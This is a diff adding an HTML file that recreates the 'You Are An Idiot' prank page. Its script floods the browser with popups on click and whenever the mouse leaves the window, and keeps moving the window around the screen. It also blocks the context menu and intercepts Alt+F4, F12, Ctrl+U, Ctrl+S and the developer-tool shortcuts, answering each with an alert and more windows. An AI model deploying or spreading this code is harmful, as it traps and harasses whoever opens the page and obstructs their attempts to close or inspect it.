@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Idiot!</title>
+	
+	<meta name="author" content="you dont know who iam">
+	<meta name="description" content="This is the orgional and the best flash video on the 'net. Once found on www.youdontknowwhoiam.org, not found where it belong, right here on ...">
+
+	<link rel="icon" type="image/png" href="youareanidiot.png">
+
+	<style>
+		html, body {
+			margin: 0;
+			padding: 0;
+			height: 100%;
+			width: 100%;
+			overflow: hidden;
+			background-color: #ffffff;
+			cursor: default;
+			user-select: none;
+			-webkit-user-select: none;
+		}
+
+		.idiot-container {
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			width: 100%;
+			height: 100%;
+		}
+
+		.idiot-container img {
+			height: 100%;
+			width: auto;
+			max-width: 100%;
+			object-fit: contain;
+		}
+	</style>
+</head>
+<body>
+
+	<div class="idiot-container">
+		<audio id="youare-audio" src="you-are-an-idiot.mp3" loop></audio>
+		<img src="idiot.gif" alt="You Are An Idiot" draggable="false" oncontextmenu="return false;">
+	</div>
+
+	<script>
+		const audio = document.getElementById('youare-audio');
+
+		document.body.addEventListener('click', () => {
+			audio.play().catch(err => {});
+			openWindow('open.html');
+		});
+
+		function openWindow(url) {
+			var aWindow = window.open(url, "_blank", 'width=357,height=330,menubar=no,status=no,toolbar=no,resizable=no,titlebar=no,alwaysRaised=yes');
+			if (aWindow) {
+				try {
+                    aWindow.blur();
+                    window.focus();
+                } catch(e) {}
+				setTimeout(() => {
+                    try { aWindow.opener = null; } catch(e) {}
+                }, 150);
+			}
+		}
+
+		function proCreate() {	
+			for (var i = 0; i < 6; i++) {
+				openWindow('open.html');
+			}
+		}
+
+		window.onmouseout = function () {
+			proCreate();
+			return null;
+		};
+
+		document.addEventListener('contextmenu', event => event.preventDefault());
+		
+		document.addEventListener('keydown', function(e) {
+            var keyCode = e.keyCode || e.which;
+			if (
+                e.key === 'F12' || keyCode == 123 || 
+                (e.altKey && (e.key === 'F4' || keyCode == 115)) || 
+                (e.ctrlKey && (e.key === 's' || e.key === 'S' || keyCode == 83)) || 
+                (e.ctrlKey && (e.key === 'u' || e.key === 'U' || keyCode == 85)) || 
+                (e.ctrlKey && e.shiftKey && (e.key === 'Escape' || keyCode == 27)) || 
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || keyCode == 73 || keyCode == 74 || keyCode == 67))
+            ) {
+				e.preventDefault();
+                alert("You are an idiot!");
+				proCreate(); 
+				return false;
+            }
+		});
+
+		// --- LÓGICA DE FÍSICAS DE REBOTE INDEPENDIENTES (Velocidad 55) ---
+		const pantallaAncho = window.screen.availWidth;
+		const pantallaAlto = window.screen.availHeight;
+		const anchoV = 357;
+		const altoV = 330;
+
+		let xPos = Math.random() * (pantallaAncho - anchoV);
+		let yPos = Math.random() * (pantallaAlto - altoV);
+		
+		let xOff = Math.random() > 0.5 ? (Math.random() * 8 + 8) : -(Math.random() * 8 + 8);
+		let yOff = Math.random() > 0.5 ? (Math.random() * 8 + 8) : -(Math.random() * 8 + 8);
+		
+		let flagRun = 1;
+
+		function playBall() {
+			xPos += xOff;
+			yPos += yOff;
+			
+			if (xPos > pantallaAncho - anchoV) {
+				xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+				window.focus();
+			}    
+			if (xPos < 0) {
+				xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+				window.focus();
+			}
+			
+			if (yPos > pantallaAlto - altoV) {
+				yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+				window.focus();
+			} 		
+			if (yPos < 0) {
+				yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+				window.focus();
+			}
+			
+			if (flagRun == 1) {
+				window.moveTo(xPos, yPos);
+				setTimeout(playBall, 1);
+			}
+		}
+
+		window.onload = function () {
+			flagRun = 1;
+			playBall();
+            audio.play().catch(err => console.log("Esperando foco para audio automático"));
+			return true;
+		}
+	</script>
+</body>
+</html>
